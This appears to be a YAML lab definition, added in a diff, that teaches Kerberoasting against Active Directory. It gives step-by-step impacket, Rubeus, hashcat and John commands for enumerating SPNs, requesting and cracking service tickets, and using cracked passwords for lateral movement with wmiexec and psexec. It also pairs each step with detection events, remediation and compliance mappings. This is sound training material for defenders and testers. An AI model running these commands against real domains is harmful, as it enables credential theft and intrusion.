@@ -1,0 +1,195 @@
+name: "Kerberoasting Attack"
+id: "ad-kerb-001"
+category: "Active Directory Security"
+subcategory: "Kerberos Attacks"
+difficulty: "intermediate"
+estimated_time: "60"
+
+tags:
+  - active-directory
+  - kerberos
+  - kerberoasting
+  - spn
+  - tgs
+  - hashcat
+  - credential-access
+  - mitre-t1558.003
+  - rubeus
+  - impacket
+
+description: |
+  Request Kerberos TGS tickets for Service Principal Names (SPNs) and crack them
+  offline to recover service account plaintext passwords. Does not require
+  elevated privileges — any domain user can execute.
+
+learning_objectives:
+  - Enumerate service accounts with SPNs registered in Active Directory
+  - Request TGS tickets for target SPNs using Kerberos protocol
+  - Crack retrieved tickets offline using hashcat or john
+  - Map to MITRE ATT&CK T1558.003 and compliance controls
+
+tools:
+  - "Impacket (GetUserSPNs)"
+  - "Rubeus"
+  - "Hashcat"
+  - "John the Ripper"
+  - "PowerView"
+  - "BloodHound"
+
+prerequisites:
+  - "Valid low-privileged domain user credentials"
+  - "Network access to domain controller (TCP 88, TCP 389)"
+  - "Understanding of Kerberos authentication flow"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate accounts with Service Principal Names (SPNs)"
+    commands:
+      - "# From Linux using impacket"
+      - "impacket-GetUserSPNs '[domain]/[username]:[password]' -dc-ip [dc_ip] -request"
+      - "# From Windows using PowerView"
+      - "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,admincount"
+      - "# Native Windows"
+      - "setspn -T [domain] -Q */*"
+      - "# LDAP query via ldapsearch"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'DC=[domain_dc1],DC=[domain_dc2]' '(servicePrincipalName=*)' samAccountName servicePrincipalName"
+    expected_output: "List of user accounts with registered SPNs (e.g., MSSQLSvc, HTTP, HOST)"
+    detection: "LDAP queries for servicePrincipalName attribute; event ID 4769 in DC logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Prioritize high-value targets (admin accounts with SPNs)"
+    commands:
+      - "impacket-GetUserSPNs '[domain]/[username]:[password]' -dc-ip [dc_ip] -request | grep -i 'admin\\|svc\\|service\\|sql\\|iis\\|exchange'"
+      - "# Check AdminCount = 1 (protected by AdminSDHolder)"
+      - "Get-DomainUser -SPN -AdminCount | Select-Object samaccountname,serviceprincipalname"
+      - "# BloodHound: identify Kerberoastable users"
+      - "MATCH (u:User {hasspn:true}) RETURN u.name, u.admincount ORDER BY u.admincount DESC"
+    expected_output: "Prioritized list of Kerberoastable accounts, especially those with admin privileges"
+    detection: "LDAP enumeration queries; BloodHound collection events in Windows Security log"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Request TGS tickets (Kerberoast) from Linux"
+    commands:
+      - "impacket-GetUserSPNs '[domain]/[username]:[password]' -dc-ip [dc_ip] -request -outputfile /tmp/tgs_tickets.hash"
+      - "# Target specific account"
+      - "impacket-GetUserSPNs '[domain]/[username]:[password]' -dc-ip [dc_ip] -request-user [service_account]"
+      - "# Using Kerberoast.py"
+      - "python3 kerberoast.py -u [username] -p [password] -d [domain] -dc [dc_ip] -o /tmp/hashes.txt"
+    expected_output: "Kerberos 5 TGS-REP etype 23 hashes ($krb5tgs$23$...) saved to file"
+    detection: "Event ID 4769 — Kerberos Service Ticket requested with encryption type 0x17 (RC4)"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Request TGS tickets from Windows using Rubeus"
+    commands:
+      - "# Kerberoast all accounts"
+      - "Rubeus.exe kerberoast /outfile:C:\\temp\\hashes.txt"
+      - "# Kerberoast specific account"
+      - "Rubeus.exe kerberoast /user:[service_account] /outfile:C:\\temp\\hash.txt"
+      - "# Request AES256 tickets (less detectable, harder to crack)"
+      - "Rubeus.exe kerberoast /aes /outfile:C:\\temp\\aes_hashes.txt"
+      - "# RC4 downgrade for faster cracking"
+      - "Rubeus.exe kerberoast /rc4opsec /outfile:C:\\temp\\rc4_hashes.txt"
+    expected_output: "TGS hashes in hashcat format saved to file"
+    detection: "Event ID 4769 for TGS requests; Rubeus execution on host (process creation event 4688)"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Crack TGS hashes offline with hashcat"
+    commands:
+      - "# Identify hash type"
+      - "hashcat --identify /tmp/tgs_tickets.hash"
+      - "# Crack with wordlist (RC4 / etype 23)"
+      - "hashcat -m 13100 /tmp/tgs_tickets.hash /usr/share/wordlists/rockyou.txt"
+      - "# Crack with wordlist + rules"
+      - "hashcat -m 13100 /tmp/tgs_tickets.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+      - "# AES256 etype 18"
+      - "hashcat -m 19700 /tmp/tgs_tickets.hash /usr/share/wordlists/rockyou.txt"
+      - "# John the Ripper alternative"
+      - "john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tgs_tickets.hash"
+    expected_output: "Plaintext password recovered for service account"
+    detection: "No network-level detection — offline attack; GPU utilization spike on attacker host"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Use recovered credentials for lateral movement"
+    commands:
+      - "# Validate recovered password"
+      - "impacket-smbclient '[domain]/[service_account]:[recovered_password]' -dc-ip [dc_ip]"
+      - "# If service account has admin rights"
+      - "impacket-wmiexec '[domain]/[service_account]:[recovered_password]@[target_ip]'"
+      - "impacket-psexec '[domain]/[service_account]:[recovered_password]@[target_ip]'"
+      - "# Check group memberships"
+      - "net user [service_account] /domain"
+    expected_output: "Successful authentication and potential administrative access with recovered credentials"
+    detection: "Successful logon events (4624) for service account from unexpected source IP"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1558.003"
+    description: "Steal or Forge Kerberos Tickets: Kerberoasting"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-5"
+    description: "Authenticator management — password complexity for service accounts"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges to dedicated administrator accounts"
+  - standard: "PCI DSS v4.0"
+    control: "8.3.6"
+    description: "Password complexity and length requirements"
+
+detection:
+  network_indicators:
+    - "High volume of TGS requests (RC4/etype 0x17) from single user account"
+    - "TGS requests for multiple different SPNs in rapid succession"
+    - "Kerberos traffic on port 88 with unusual ticket request patterns"
+  log_indicators:
+    - "Event ID 4769: Multiple Kerberos Service Ticket requests with Ticket Encryption Type 0x17"
+    - "Event ID 4769 for accounts not typically requesting that service"
+    - "Honey account SPN TGS request (decoy service account triggers alert)"
+  endpoint_indicators:
+    - "Rubeus.exe or similar tool execution (process creation event 4688)"
+    - "LDAP queries for servicePrincipalName attribute from non-admin accounts"
+
+remediation:
+  immediate:
+    - "Identify and rotate passwords for all Kerberoastable service accounts immediately"
+    - "Ensure all service account passwords are at least 25+ characters, randomly generated"
+    - "Audit which accounts have SPNs registered and remove unused SPNs"
+  long_term:
+    - "Migrate service accounts to Group Managed Service Accounts (gMSA) — auto-rotating passwords"
+    - "Implement AES256 Kerberos encryption for all service accounts (disable RC4)"
+    - "Enable Protected Users security group for privileged service accounts"
+    - "Deploy honeypot/decoy service accounts with alerting on TGS requests"
+    - "Monitor Event ID 4769 for RC4 encryption type tickets"
+
+variables:
+  domain: "corp.example.com"
+  domain_dc1: "corp"
+  domain_dc2: "example"
+  username: "jsmith"
+  password: "Password123"
+  dc_ip: "192.168.1.10"
+  service_account: "svc_sql"
+  target_ip: "192.168.1.50"
+  recovered_password: ""
+
+assessment_questions:
+  - "Why are service accounts with SPNs targeted in Kerberoasting?"
+  - "What encryption type makes Kerberoasting fastest to crack, and why?"
+  - "How do Group Managed Service Accounts (gMSA) mitigate Kerberoasting?"
+  - "What Windows Event ID indicates a Kerberos service ticket request?"
+  - "How can you identify Kerberoastable accounts in BloodHound?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1558/003/"
+    title: "MITRE ATT&CK - Kerberoasting"
+  - url: "https://github.com/GhostPack/Rubeus"
+    title: "Rubeus - Kerberos Attack Toolkit"
+  - url: "https://github.com/fortra/impacket"
+    title: "Impacket - GetUserSPNs"
+  - url: "https://adsecurity.org/?p=3458"
+    title: "Kerberoasting Revisited - ADSecurity"
